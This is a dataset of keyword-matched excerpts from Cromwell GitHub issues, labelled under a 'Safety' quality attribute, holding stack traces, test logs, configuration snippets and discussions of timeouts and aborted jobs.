cromiam.webservice.SwaggerServiceSpec.$anonfun$new$1(SwaggerServiceSpec.scala:27) at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85) at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83) at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104) at org.scalatest.Transformer.apply(Transformer.scala:22) at org.scalatest.Transformer.apply(Transformer.scala:20) at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682) at org.scalatest.TestSuite.withFixture(TestSuite.scala:196) at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195) at org.scalatest.FlatSpec.withFixture(FlatSpec.scala:1685) at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680) at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692) at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289) at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692) at org.scalatest.FlatSpecLike.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4357:103,Timeout,TimeoutException,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4357,1,['Timeout'],['TimeoutException']
Safety,"https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/793/consoleFull. 14:08:29 cromwell-test_1 | [info] - should execute calls with input files and localize them appropriately *** FAILED *** (13 seconds, 25 milliseconds); 14:08:29 cromwell-test_1 | [info] $anon$1 was thrown during property evaluation. (SharedFileSystemJobExecutionActorSpec.scala:119); 14:08:29 cromwell-test_1 | [info] Message: A timeout occurred waiting for a future to complete. Queried 21 times, sleeping 500 milliseconds between each query.; 14:08:29 cromwell-test_1 | [info] Location: (SharedFileSystemJobExecutionActorSpec.scala:137); 14:08:29 cromwell-test_1 | [info] Occurred at table row 2 (zero based, not counting headings), which had values (; 14:08:29 cromwell-test_1 | [info] conf = BackendConfigurationDescriptor(Config(SimpleConfigObject({""default-runtime-attributes"":{""continueOnReturnCode"":0,""cpu"":1,""failOnStderr"":false},""filesystems"":{""local"":{""localization"":[""soft-link""]}},""root"":""local-cromwell-executions""})),Config(SimpleConfigObject({}))),; 14:08:29 cromwell-test_1 | [info] isSymLink = true; 14:08:29 cromwell-test_1 | [info] ); 14:08:29 cromwell-test_1 | [info] org.scalatest.exceptions.TableDrivenPropertyCheckFailedException:; 14:08:29 cromwell-test_1 | [info] ...; 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.localizationSpec(SharedFileSystemJobExecutionActorSpec.scala:119); 14:08:29 cromwell-test_1 | [info] at cromwell.backend.sfs.SharedFileSystemJobExecutionActorSpec.$anonfun$new$4(SharedFileSystemJobExecutionActorSpec.scala:156); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); 14:08:29 cromwell-test_1 | [info] at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); 14:08:29 cromwell-test_1 | [info] at org.scalatest.Transformer.apply(Transformer.scala:22); 14:08:29 cromwell-t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4319:421,timeout,timeout,421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4319,1,['timeout'],['timeout']
Safety,"https://gatkforums.broadinstitute.org/firecloud/discussion/11853/error-message-the-job-was-aborted-from-outside-cromwell. AC: The message ""Job was aborted from outside Cromwell"" itself doesn't have enough information to understand what happened, and what to do next. It seems like there are two known failures that can lead to that error message:. 1. As described above, when an operation self-cancels due to a timeout, Cromwell could supplement the existing message with:; ```Jobs that run for longer than a week are not yet supported, and thus this job was cancelled because it exceeded that upper-limit. Please try to reduce the duration of your job. To get more details about your jobs, here are links to the stdout/stderr files...```. 2. As described in the forum post above, when Cromwell restarts a workflow and a job had been started by the engine/backend but didn't have an op id -- it gets marked as a failed job with the same error. Instead, if Cromwell knows that the reason it couldn't find an op id was because it is restarting -- then it should not report the message it does today at all and simply say:; ```When Cromwell restarted, it realized the job was not yet started, and so this is a benign failure. Cromwell will try attempting to execute this job again.```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-424966266:91,abort,aborted-from-outside-cromwell,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-424966266,6,"['abort', 'timeout']","['aborted', 'aborted-from-outside-cromwell', 'timeout']"
Safety,"https://github.com/broadinstitute/cromwell/blob/215cca97e6efafa7406fd89b38e21a39ce2d0d4e/cromwell.examples.conf#L440. It seems like the default configuration sends the stdout and stderr to the same filenames twice. In the config above, qsub is called with -o EG:; ```e1bd0801-52c1-445c-8513-72e9872a0c7d/call-thing/execution/stdout```. In the script that will be executed on the node, there is some shenanigans:; ```; (; cd .../e1bd0801-52c1-445c-8513-72e9872a0c7d/call-thing/execution. bla bla bla my command invocation; ) > >(tee '.../e1bd0801-52c1-445c-8513-72e9872a0c7d/call-thing/execution/stdout') 2> >(tee '.../e1bd0801-52c1-445c-8513-72e9872a0c7d/call-thing/execution/stderr' >&2); ```. Those 'tees' are generated by cromwell somewhere, I do not know if the config has control of that. I don't know the details of what will happen, but I do not think it will be healthy. I smell race conditions. I came across this trying to debug missing log data when SGE aborts a job.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3705:965,abort,aborts,965,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3705,1,['abort'],['aborts']
Safety,"ication/octet-stream]...; / [0/1 files][ 0.0 B/ 3.7 MiB] 0% Done ; BadRequestException: 400 The maximum object length is 1024 characters, but got a name with 1055 characters: ''gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-...''; CommandException: 1 file/object could not be transferred.; Copying file:///cromwell_root/bcbiotest/gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-calculate_sv_coverage/shard-0/cromwell_root/bcbiotest/gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-calculate_sv_bins/cromwell_root/bcbiotest/gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-postprocess_alignment/shard-0/cromwell_root/bcbiotest/gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-postprocess_alignment_to_rec/cromwell_root/bcbiotest/gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-alignment/shard-0/wf-alignment.cwl/94c8f53c-dad4-4c48-9e09-f6927356f352/call-merge_split_alignments/cromwell_root/bcbiotest/gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-alignment/shard-0/wf-alignment.cwl/94c8f53c-dad4-4c48-9e09-f6927356f352/call-process_alignment/shard-0/cromwell_root/align/Test2/Test2-sort.bam.bai [Content-Type=application/octet-stream]...; / [0/1 files][ 0.0 B/ 184.0 B] 0% Done ; BadRequestException: 400 The maximum object length is 1024 characters, but got a name with 1059 characters: ''gcp/work_cromwell/main-somatic.cwl/c21b8bf4-9f80-45a3-9a23-f345b4d8f295/call-...''; CommandException: 1 file/object could not be transferred.; ```; We could avoid in this case by shortening the folder name we're using for cromwell storage but I'm worried about hitting this later since it will be dependent on sample names (the `Test2` in these paths) and users correctly setting a short root path. Do you know where this limit originates from? Is there any way to work around it? Thanks for any suggestions.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4471:3072,avoid,avoid,3072,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4471,1,['avoid'],['avoid']
Safety,"idss-purple.packed.json"" -F ""workflowInputs=@gridss-purple.packed.input.json"" -F ""workflowOptions=@/opt/cromwell/configs/options.json"" -F ""workflowType=CWL"" -F ""workflowTypeVersion=v1.0"" -F ""workflowRoot=main""; ```. # Inputs. ## gridss-purple.packed.json. <details>. <summary> Click to expand! </summary>. ```; {; ""$graph"": [; {; ""class"": ""CommandLineTool"",; ""doc"": ""AMBER is designed to generate a tumor BAF file for use in PURPLE from a provided VCF of likely heterozygous SNP sites.\n\nWhen using paired reference/tumor bams,\nAMBER confirms these sites as heterozygous in the reference sample bam then calculates the\nallelic frequency of corresponding sites in the tumor bam.\nIn tumor only mode, all provided sites are examined in the tumor with additional filtering then applied.\n\nThe Bioconductor copy number package is then used to generate pcf segments from the BAF file.\n\nWhen using paired reference/tumor data, AMBER is also able to:\n1. detect evidence of contamination in the tumor from homozygous sites in the reference; and\n2. facilitate sample matching by recording SNPs in the germline\n"",; ""requirements"": [; {; ""dockerPull"": ""quay.io/biocontainers/hmftools-amber:3.3--0"",; ""class"": ""DockerRequirement""; },; {; ""expressionLib"": [; ""var get_start_memory = function(){ /* Start with 2 Gb */ return 2000; }"",; ""var get_max_memory_from_runtime_memory = function(max_ram){ /* Get Max memory and subtract heap memory */ return max_ram - get_start_memory(); }""; ],; ""class"": ""InlineJavascriptRequirement""; },; {; ""coresMin"": 16,; ""ramMin"": 32000,; ""class"": ""ResourceRequirement""; },; {; ""class"": ""ShellCommandRequirement""; }; ],; ""baseCommand"": [; ""AMBER""; ],; ""arguments"": [; {; ""prefix"": ""-Xms"",; ""separate"": false,; ""valueFrom"": ""$(get_start_memory())m"",; ""position"": -2; },; {; ""prefix"": ""-Xmx"",; ""separate"": false,; ""valueFrom"": ""$(get_max_memory_from_runtime_memory(runtime.ram))m"",; ""position"": -1; }; ],; ""inputs"": [; {; ""type"": ""File"",; ""doc"": ""Path to vcf file containing l",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:1113,detect,detect,1113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['detect'],['detect']
Safety,"if a job is aborted before it is started, cancel it efficiently",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2966:12,abort,aborted,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2966,1,['abort'],['aborted']
Safety,"il.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3813,Unsafe,Unsafe,3813,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"il.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:990); 	at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3562); 	at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3462); 	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3905); 	at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2530); 	at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2683); 	at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2491); 	at com.mysql.jdbc.ConnectionImpl.setAutoCommit(ConnectionImpl.java:4807); 	at com.zaxxer.hikari.pool.ProxyConnection.setAutoCommit(ProxyConnection.java:379); 	at com.zaxxer.hikari.pool.HikariProxyConnection.setAutoCommit(HikariProxyConnection.java); 	at slick.jdbc.JdbcBackend$BaseSession.startInTransaction(JdbcBackend.scala:470); 	at slick.jdbc.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:39); 	at slick.jdbc.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:36); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: java.io.EOFException: Can not read response from server. Expected to read 4 bytes, read 0 bytes before connection was unexpectedly lost.; 	at com.mysql.jdbc.MysqlIO.readFully(MysqlIO.java:3014); 	at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3472); 	... 16 common frames omitted. ```. The `Lock wait timeout exceeded; try restarting transaction submit failed.` one keeps happening over and over. Workflows that have been submitted do not start (the only log entry is the ""workflow submitted"" one).; The workflow store entry table is empty, which makes sense in terms of nothing happening.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4360:8140,timeout,timeout,8140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4360,1,['timeout'],['timeout']
Safety,"ill; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 10000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""service-account""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""service-account"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""europe-west4"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:12207,timeout,timeout,12207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,2,['timeout'],['timeout']
Safety,in `when(WorkflowExecutionAbortingState)` there's a handler for `AbortedResponse` which appears to be doing some reasonable stuff but I can't find anything sending that message.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1376:65,Abort,AbortedResponse,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1376,1,['Abort'],['AbortedResponse']
Safety,"in the workbench chat room they were tracking something where rawls was spamming cromwell with abort requests. The root cause was that a workbench submission was requested to abort which causes rawls to continuously send abort requests to the submission's workflows until it is aborted, which sometimes never happens. they're not fans of this behavior. Tagging @helgridly and @jmthibault79 as people who can provide more details.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976:95,abort,abort,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976,4,['abort'],"['abort', 'aborted']"
Safety,increase test timeout on akka http routes for slow CI envs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4250:14,timeout,timeout,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4250,1,['timeout'],['timeout']
Safety,"ine 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n); gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam -> /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam (cp failed: gsutil -q -m cp gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam /mnt/local-disk/5aa919de-0aa0-43ec-9ec3-288481102b6d/tcga/STAD/DNA/WXS/BI/ILLUMINA/C440.TCGA-HU-A4H3-01A-21D-A25D-08.1.bam, command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n Fil",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:12404,timeout,timeout,12404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"ing a success. ```; 2023-04-18 21:59:54,599 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:108:1]: Status change from Running to Success; 2023-04-18 22:00:09,060 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:107:1]: Status change from Running to Success; 2023-04-18 22:00:18,464 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:106:1]: Status change from Running to Success; 2023-04-18 22:01:20,604 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:111:1]: Status change from Running to Success; 2023-04-18 22:14:47,728 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: Aborting workflow; 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:262:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/9178938377659283430); 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:112:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/8559201934542591362); 2023-04-18 22:14:48,295 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Successfully requested cancellation of projects/16371921765/locations/us-central1/operations/9178938377659283430; 2023-04-18 22:15:56,564 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: Status change from Running to Success; 2023-04-18 22:16:44,505 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Status change from Running to Cancelled; 2023-04-18 22:16:44,539 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: WorkflowExecutionActor [UUID(10fa31a8)] aborted: myco.pull:262:1; 2023-04-18 22:16:45,1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7121:4937,Abort,Aborted,4937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7121,1,['Abort'],['Aborted']
Safety,"instead of registering the workflow id as the collection, as currently happens, register the collection name. if a collection was not specified (it's optional) create a collection name, `USERNAME_caas_collection`. . If the collection name specified already exists in sam and the user does not have write access to it it will return an error (or at least that's the belief of the author of this ticket). Make sure to detect that and return an appropriate error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2837:416,detect,detect,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2837,1,['detect'],['detect']
Safety,"io=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:40437,Unsafe,Unsafe,40437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"ion settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2019-02-11 10:13:27,65] [info] WorkflowExecutionActor-52999e15-953f-44d6-aaae-1774c74d2910 [52999e15]: Workflow test1 complete. Final Outputs:; {; ""test1.hello.out"": ""/spin1/users/wresch/test_data/cromwell/test1/cromwell-executions/test1/52999e15-953f-44d6-aaae-1774c74d2910/call-hello/execution/World.txt""; }; [2019-02-11 10:13:27,69] [info] WorkflowManagerActor WorkflowActor-52999e15-953f-44d6-aaae-1774c74d2910 is in a terminal state: WorkflowSucceededState; [2019-02-11 10:13:35,97] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""test1.hello.out"": ""/spin1/users/wresch/test_data/cromwell/test1/cromwell-executions/test1/52999e15-953f-44d6-aaae-1774c74d2910/call-hello/execution/World.txt""; },; ""id"": ""52999e15-953f-44d6-aaae-1774c74d2910""; }; [2019-02-11 10:13:36,30] [info] Workflow polling stopped; [2019-02-11 10:13:36,32] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2019-02-11 10:13:36,33] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2019-02-11 10:13:36,34] [info] Aborting all running workflows.; [2019-02-11 10:13:36,34] [info] WorkflowStoreActor stopped; [2019-02-11 10:13:36,34] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2019-02-11 10:13:36,34] [info] JobExecutionTokenDispenser stopped; [2019-02-11 10:13:36,34] [info] WorkflowLogCopyRouter stopped; [2019-02-11 10:13:36,35] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2019-02-11 10:13:36,35] [info] WorkflowManagerActor All workflows finished; [2019-02-11 10:13:36,35] [info] WorkflowManagerActor stopped; [2019-02-11 10:13:36,78] [info] Connection pools shut down; [2019-02-11 10:13:36,78] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2019-02-11 10:13:36,78] [info] SubWorkflowStoreActor stoppe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:15287,Timeout,Timeout,15287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,3,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,"ion.WorkflowExecutionActor.akka$actor$Timers$$super$aroundReceive(WorkflowExecutionActor.scala:57); 	at akka.actor.Timers.aroundReceive(Timers.scala:51); 	at akka.actor.Timers.aroundReceive$(Timers.scala:40); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:57); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); 	at akka.actor.ActorCell.invoke(ActorCell.scala:583); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2024-03-12 20:24:51 cromwell-system-akka.actor.default-dispatcher-4 INFO - Message [cromwell.engine.workflow.lifecycle.EngineLifecycleActorAbortCommand$] from Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-a06a4c5e-fbf7-4c1d-ac71-b036aaf48fbc#2096097107] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-a06a4c5e-fbf7-4c1d-ac71-b036aaf48fbc/WorkflowExecutionActor-a06a4c5e-fbf7-4c1d-ac71-b036aaf48fbc#659989485] was not delivered. [1] 